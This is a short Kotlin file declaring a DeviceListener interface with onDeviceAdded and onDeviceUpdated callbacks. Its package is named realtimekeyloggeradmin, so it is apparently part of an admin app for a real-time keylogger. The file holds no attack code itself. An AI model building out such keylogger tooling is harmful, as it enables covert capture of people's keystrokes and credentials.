package com.shubhamgupta16.realtimekeyloggeradmin.helpers

import com.shubhamgupta16.realtimekeyloggeradmin.models.DeviceModel

interface DeviceListener {
    fun onDeviceAdded(model: DeviceModel)
    fun onDeviceUpdated(model: DeviceModel)
}